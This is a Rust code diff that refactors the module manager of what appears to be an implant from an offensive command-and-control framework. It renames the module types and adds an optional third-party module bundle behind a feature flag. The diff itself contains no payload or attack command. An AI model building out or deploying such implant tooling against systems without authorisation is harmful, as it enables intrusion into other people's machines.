@@ -6,19 +6,19 @@ use malefic_proto::new_spite;
 use malefic_proto::proto::implantpb::Spite;
 use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::Addon;
-use modules::{check_field, MaleficModule};
+use malefic_modules::{check_field, MaleficBundle, MaleficModule};
 
 use crate::check_body;
 use crate::common::error::MaleficError;
 use crate::manager::addons::{AddonMap, MaleficAddon};
 
-type ModuleRegister = extern "C" fn () -> HashMap<String, Box<MaleficModule>>;
-type ModuleMap = HashMap<String, Box<MaleficModule>>;
+type ModuleRegister = extern "C" fn () -> MaleficBundle;
+
 
 
 pub struct MaleficManager {
     bundles: HashMap<String, ModuleRegister>,
-    pub(crate) modules: Box<ModuleMap>,
+    pub(crate) modules: Box<MaleficBundle>,
     addons: AddonMap
 }
 
@@ -39,7 +39,9 @@ impl MaleficManager{
 
     pub fn refresh_module(&mut self) -> Result<(), MaleficError> {
         self.bundles.clear();
-        self.bundles.insert("origin".to_string(), modules::register_modules as ModuleRegister);
+        self.bundles.insert("origin".to_string(), malefic_modules::register_modules as ModuleRegister);
+        #[cfg(feature = "malefic-3rd")]
+        self.bundles.insert("3rd".to_string(), malefic_3rd::register_3rd as ModuleRegister);
         self.reload()
     }
 
